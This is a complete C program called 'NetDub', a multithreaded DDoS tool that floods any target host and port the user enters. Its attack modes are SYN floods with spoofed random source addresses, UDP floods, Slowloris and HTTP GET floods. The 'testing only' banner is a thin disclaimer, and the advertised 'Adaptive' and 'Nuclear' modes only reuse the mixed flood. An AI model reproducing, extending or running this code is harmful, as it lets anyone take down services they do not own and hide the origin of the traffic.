#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/epoll.h>
#include <sys/resource.h>

#define RED     "\033[91m"
#define GREEN   "\033[92m"
#define YELLOW  "\033[93m"
#define BLUE    "\033[94m"
#define MAGENTA "\033[95m"
#define CYAN    "\033[96m"
#define WHITE   "\033[97m"
#define RESET   "\033[0m"

// Global variables
volatile int running = 1;
volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
int attack_mode = 0;
char target_ip[16];
int target_port;
int thread_count = 100;
int packet_size = 1024;
int attack_duration = 60;

// Attack modes
#define SYN_FLOOD       1
#define UDP_FLOOD       2
#define SLOWLORIS       3
#define SOCKSTRESS      4
#define HTTP_FLOOD      5
#define ICMP_FLOOD      6
#define MIXED_FLOOD     7
#define ADAPTIVE_FLOOD  8

// Thread data structure
typedef struct {
    int thread_id;
    struct sockaddr_in target_addr;
    int duration;
} thread_data_t;

// Packet headers
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf(RED "\n[!] Stopping attack...\n" RESET);
}

// Generate random IP
char* random_ip() {
    static char ip[16];
    sprintf(ip, "%d.%d.%d.%d", 
            rand() % 256, rand() % 256, 
            rand() % 256, rand() % 256);
    return ip;
}

// Calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    result = ~sum;
    return result;
}

// SYN Flood Attack
void* syn_flood_attack(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    int sockfd;
    struct sockaddr_in sin;
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct pseudo_header psh;
    char packet[4096];
    int one = 1;
    const int *val = &one;
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set socket options
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sockfd);
        return NULL;
    }

    memset(packet, 0, 4096);
    
    // IP Header
    iph = (struct iphdr*)packet;
    // TCP Header
    tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    time_t start_time = time(NULL);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        // Randomize source
        char *src_ip = random_ip();
        
        // Fill IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(src_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short*)packet, iph->tot_len >> 1);
        
        // Fill TCP Header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand() % 4294967295);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Calculate TCP checksum
        psh.source_address = inet_addr(src_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short*)pseudogram, psize);
        free(pseudogram);
        
        // Send packet
        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) > 0) {
            total_packets++;
            total_bytes += iph->tot_len;
        }
    }
    
    close(sockfd);
    return NULL;
}

// UDP Flood Attack
void* udp_flood_attack(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char *buffer;
    
    buffer = malloc(packet_size);
    memset(buffer, 'A', packet_size);
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("UDP socket creation failed");
        free(buffer);
        return NULL;
    }
    
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    
    time_t start_time = time(NULL);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        if (sendto(sockfd, buffer, packet_size, 0, 
                  (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            total_packets++;
            total_bytes += packet_size;
        }
    }
    
    close(sockfd);
    free(buffer);
    return NULL;
}

// Slowloris Attack
void* slowloris_attack(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    int *sockets;
    int socket_count = 1000;
    char request[1024];
    
    sockets = malloc(socket_count * sizeof(int));
    
    // Create sockets
    for (int i = 0; i < socket_count; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] < 0) continue;
        
        // Set non-blocking
        int flags = fcntl(sockets[i], F_GETFL, 0);
        fcntl(sockets[i], F_SETFL, flags | O_NONBLOCK);
        
        // Connect
        if (connect(sockets[i], (struct sockaddr*)&data->target_addr, 
                   sizeof(data->target_addr)) < 0) {
            if (errno != EINPROGRESS) {
                close(sockets[i]);
                sockets[i] = -1;
                continue;
            }
        }
        
        // Send partial HTTP request
        snprintf(request, sizeof(request), 
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (compatible; NetDub/1.0)\r\n"
                "Accept: */*\r\n", 
                rand(), target_ip);
        
        send(sockets[i], request, strlen(request), MSG_NOSIGNAL);
    }
    
    time_t start_time = time(NULL);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        for (int i = 0; i < socket_count; i++) {
            if (sockets[i] < 0) continue;
            
            // Send keep-alive header
            snprintf(request, sizeof(request), "X-a: %d\r\n", rand());
            if (send(sockets[i], request, strlen(request), MSG_NOSIGNAL) < 0) {
                close(sockets[i]);
                sockets[i] = -1;
            } else {
                total_packets++;
                total_bytes += strlen(request);
            }
        }
        sleep(10);
    }
    
    // Clean up
    for (int i = 0; i < socket_count; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
    }
    
    free(sockets);
    return NULL;
}

// HTTP Flood Attack
void* http_flood_attack(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    int sockfd;
    char request[2048];
    char response[1024];
    
    time_t start_time = time(NULL);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        // Set timeout
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        
        if (connect(sockfd, (struct sockaddr*)&data->target_addr, 
                   sizeof(data->target_addr)) == 0) {
            
            // Send HTTP request
            snprintf(request, sizeof(request),
                    "GET /?%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (compatible; NetDub/1.0)\r\n"
                    "Accept: */*\r\n"
                    "Connection: close\r\n\r\n",
                    rand(), target_ip);
            
            if (send(sockfd, request, strlen(request), 0) > 0) {
                recv(sockfd, response, sizeof(response), 0);
                total_packets++;
                total_bytes += strlen(request);
            }
        }
        
        close(sockfd);
    }
    
    return NULL;
}

// Mixed flood attack
void* mixed_flood_attack(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    
    time_t start_time = time(NULL);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        int attack_type = rand() % 4;
        
        switch (attack_type) {
            case 0:
                syn_flood_attack(arg);
                break;
            case 1:
                udp_flood_attack(arg);
                break;
            case 2:
                slowloris_attack(arg);
                break;
            case 3:
                http_flood_attack(arg);
                break;
        }
        
        usleep(100000); // 100ms delay
    }
    
    return NULL;
}

// Display banner
void display_banner() {
    printf(RED "╔══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(RED "║                          NetDub                             ║\n" RESET);
    printf(RED "║                    Ultimate DDoS Tester                     ║\n" RESET);
    printf(RED "║                        Final Version                        ║\n" RESET);
    printf(RED "╚══════════════════════════════════════════════════════════════╝\n" RESET);
    printf(YELLOW "⚠️  ROOT PRIVILEGES REQUIRED - FOR TESTING ONLY ⚠️\n" RESET);
    printf(CYAN "Author: Security Research Team\n" RESET);
    printf(CYAN "Purpose: Network Security Testing & Research\n" RESET);
    printf("\n");
}

// Display attack options
void display_menu() {
    printf(GREEN "╔══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(GREEN "║                      Attack Methods                         ║\n" RESET);
    printf(GREEN "╚══════════════════════════════════════════════════════════════╝\n" RESET);
    printf(BLUE "1. SYN Flood      " RESET "- TCP SYN flood attack (Layer 4)\n");
    printf(BLUE "2. UDP Flood      " RESET "- UDP flood attack (Layer 4)\n");
    printf(BLUE "3. Slowloris      " RESET "- Slow HTTP attack (Layer 7)\n");
    printf(BLUE "4. HTTP Flood     " RESET "- HTTP GET flood (Layer 7)\n");
    printf(BLUE "5. Mixed Flood    " RESET "- Combined attack methods\n");
    printf(BLUE "6. Adaptive Flood " RESET "- Intelligent attack adaptation\n");
    printf(RED "7. Nuclear Mode   " RESET "- Maximum intensity (⚠️ DANGEROUS)\n");
    printf("\n");
}

// Monitor thread
void* monitor_thread(void* arg) {
    time_t start_time = time(NULL);
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    
    while (running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        unsigned long long current_packets = total_packets;
        unsigned long long current_bytes = total_bytes;
        
        unsigned long long pps = current_packets - last_packets;
        unsigned long long bps = current_bytes - last_bytes;
        
        printf(CYAN "[%ld] " RESET "PPS: " YELLOW "%llu" RESET 
               " | Total: " GREEN "%llu" RESET 
               " | BPS: " MAGENTA "%.2f MB/s" RESET "\r",
               current_time - start_time, pps, current_packets, 
               (double)bps / 1024 / 1024);
        
        fflush(stdout);
        
        last_packets = current_packets;
        last_bytes = current_bytes;
    }
    
    return NULL;
}

// Set system limits
void optimize_system() {
    struct rlimit rlim;
    
    // Set maximum file descriptors
    rlim.rlim_cur = 65535;
    rlim.rlim_max = 65535;
    if (setrlimit(RLIMIT_NOFILE, &rlim) != 0) {
        printf(YELLOW "[!] Warning: Could not set file descriptor limit\n" RESET);
    }
    
    // Set maximum processes
    rlim.rlim_cur = 32768;
    rlim.rlim_max = 32768;
    if (setrlimit(RLIMIT_NPROC, &rlim) != 0) {
        printf(YELLOW "[!] Warning: Could not set process limit\n" RESET);
    }
    
    printf(GREEN "[✓] System optimized for maximum performance\n" RESET);
}

// Main function
int main() {
    // Check root privileges
    if (getuid() != 0) {
        printf(RED "[!] This program requires ROOT privileges!\n" RESET);
        printf(YELLOW "[*] Please run with: sudo ./netdub\n" RESET);
        return 1;
    }
    
    display_banner();
    
    // Optimize system
    optimize_system();
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Get target information
    printf(CYAN "Target IP/Domain: " RESET);
    char target_input[256];
    scanf("%s", target_input);
    
    // Resolve hostname if needed
    struct hostent *host_entry = gethostbyname(target_input);
    if (host_entry) {
        strcpy(target_ip, inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0])));
    } else {
        strcpy(target_ip, target_input);
    }
    
    printf(CYAN "Target Port: " RESET);
    scanf("%d", &target_port);
    
    printf(CYAN "Thread Count (default: 100): " RESET);
    scanf("%d", &thread_count);
    
    printf(CYAN "Attack Duration (seconds): " RESET);
    scanf("%d", &attack_duration);
    
    display_menu();
    printf(CYAN "Select attack method: " RESET);
    scanf("%d", &attack_mode);
    
    // Start attack
    printf(GREEN "\n[✓] Starting attack on %s:%d\n" RESET, target_ip, target_port);
    printf(YELLOW "[*] Threads: %d | Duration: %d seconds\n" RESET, 
           thread_count, attack_duration);
    printf(RED "[*] Press Ctrl+C to stop\n" RESET);
    printf("\n");
    
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    pthread_t monitor_tid;
    thread_data_t *thread_data = malloc(thread_count * sizeof(thread_data_t));
    
    // Start monitor thread
    pthread_create(&monitor_tid, NULL, monitor_thread, NULL);
    
    // Start attack threads
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].target_addr.sin_family = AF_INET;
        thread_data[i].target_addr.sin_port = htons(target_port);
        thread_data[i].target_addr.sin_addr.s_addr = inet_addr(target_ip);
        thread_data[i].duration = attack_duration;
        
        void* (*attack_func)(void*) = NULL;
        
        switch (attack_mode) {
            case 1:
                attack_func = syn_flood_attack;
                break;
            case 2:
                attack_func = udp_flood_attack;
                break;
            case 3:
                attack_func = slowloris_attack;
                break;
            case 4:
                attack_func = http_flood_attack;
                break;
            case 5:
            case 6:
            case 7:
                attack_func = mixed_flood_attack;
                break;
        }
        
        if (attack_func) {
            pthread_create(&threads[i], NULL, attack_func, &thread_data[i]);
        }
    }
    
    // Wait for completion
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    running = 0;
    pthread_join(monitor_tid, NULL);
    
    // Final statistics
    printf(GREEN "\n\n[✓] Attack completed!\n" RESET);
    printf(CYAN "Total packets sent: " YELLOW "%llu\n" RESET, total_packets);
    printf(CYAN "Total bytes sent: " YELLOW "%.2f MB\n" RESET, 
           (double)total_bytes / 1024 / 1024);
    printf(CYAN "Average PPS: " YELLOW "%.2f\n" RESET, 
           (double)total_packets / attack_duration);
    
    free(threads);
    free(thread_data);
    
    return 0;
}
